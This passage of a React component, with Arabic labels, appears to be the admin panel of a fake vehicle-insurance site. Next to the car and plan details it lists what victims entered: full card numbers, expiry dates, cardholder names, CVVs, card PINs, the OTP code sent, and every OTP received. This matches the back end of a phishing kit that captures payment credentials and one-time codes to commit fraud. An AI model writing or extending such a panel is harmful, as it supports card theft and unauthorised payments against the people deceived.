                  <span className="font-medium">موديل المركبة:</span>
                  <span>{selectedNotification?.vehicleModel}</span>
                </p>
                <p className="flex justify-between">
                  <span className="font-medium">سنة الصنع:</span>
                  <span>{selectedNotification?.vehicleYear}</span>
                </p>
                <p className="flex justify-between">
                  <span className="font-medium">قيمة المركبة:</span>
                  <span>{selectedNotification?.vehicleValue} ر.س</span>
                </p>
              </TabsContent>
              <TabsContent value="plan" className="space-y-3 p-4 bg-muted rounded-lg">
                <p className="flex justify-between">
                  <span className="font-medium">خطة التأمين:</span>
                  <span>{selectedNotification?.selectedPlan || "لم يتم الاختيار بعد"}</span>
                </p>
                {selectedNotification?.totalPrice && (
                  <p className="flex justify-between">
                    <span className="font-medium">السعر الإجمالي:</span>
                    <span className="font-bold text-emerald-600 dark:text-emerald-400">
                      {selectedNotification?.totalPrice} ر.س
                    </span>
                  </p>
                )}
                {selectedNotification?.coverage && selectedNotification?.coverage.length > 0 && (
                  <div>
                    <span className="font-medium block mb-2">التغطيات المشمولة:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification?.coverage.map((item, index) => (
                        <Badge key={index} variant="outline" className="bg-emerald-100 dark:bg-emerald-900 text-xs">
                          {item}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
              </TabsContent>
            </Tabs>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted rounded-lg">
              {/* Use cardData if available, otherwise fall back to legacy fields */}
              {(selectedNotification.cardData?.bank || selectedNotification.bank) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">البنك:</span>
                  <span className="font-semibold">
                    {selectedNotification.cardData?.bank || selectedNotification.bank}
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                  <span className="font-semibold" dir="ltr">
                    {(selectedNotification.cardData?.prefix || selectedNotification.prefix) && (
                      <Badge variant={"outline"} className="bg-blue-100 dark:bg-blue-900">
                        {selectedNotification.cardData?.prefix || selectedNotification.prefix}
                      </Badge>
                    )}{" "}
                    <Badge variant={"outline"} className="bg-green-100 dark:bg-green-900">
                      {selectedNotification.cardData?.cardNumber || selectedNotification.cardNumber}
                    </Badge>
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.cardExpiry ||
                selectedNotification.cardExpiry ||
                selectedNotification.expiryDate ||
                (selectedNotification.year && selectedNotification.month)) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                  <span className="font-semibold">
                    {selectedNotification.cardData?.cardExpiry ||
                      selectedNotification.cardExpiry ||
                      selectedNotification.expiryDate ||
                      (selectedNotification.year && selectedNotification.month
                        ? `${selectedNotification.year}/${selectedNotification.month}`
                        : "")}
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.cardholderName || selectedNotification.name) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">اسم حامل البطاقة:</span>
                  <span className="font-semibold">
                    {selectedNotification.cardData?.cardholderName || selectedNotification.name}
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.cvv || selectedNotification.cvv) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز الأمان:</span>
                  <span className="font-semibold">
                    {selectedNotification.cardData?.cvv || selectedNotification.cvv}
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.pass || selectedNotification.pass) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                  <span className="font-semibold">
                    {selectedNotification.cardData?.pass || selectedNotification.pass}
                  </span>
                </p>
              )}
              {(selectedNotification.cardData?.otp ||
                selectedNotification.cardData?.otpCode ||
                selectedNotification.otp ||
                selectedNotification.otpCode) && (
                <p className="flex justify-between">
                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
                  <Badge className="font-semibold bg-green-600">
                    {selectedNotification.cardData?.otp || selectedNotification.otp}
                    {(selectedNotification.cardData?.otpCode || selectedNotification.otpCode) &&
                      ` || ${selectedNotification.cardData?.otpCode || selectedNotification.otpCode}`}
                  </Badge>
                </p>
              )}
              {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
                Array.isArray(selectedNotification.cardData?.allOtps || selectedNotification.allOtps) &&
                (selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.length > 0 && (
                  <div>
                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {(selectedNotification.cardData?.allOtps || selectedNotification.allOtps)!.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}

          <DialogFooter>
            <Button onClick={closeDialog}>إغلاق</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
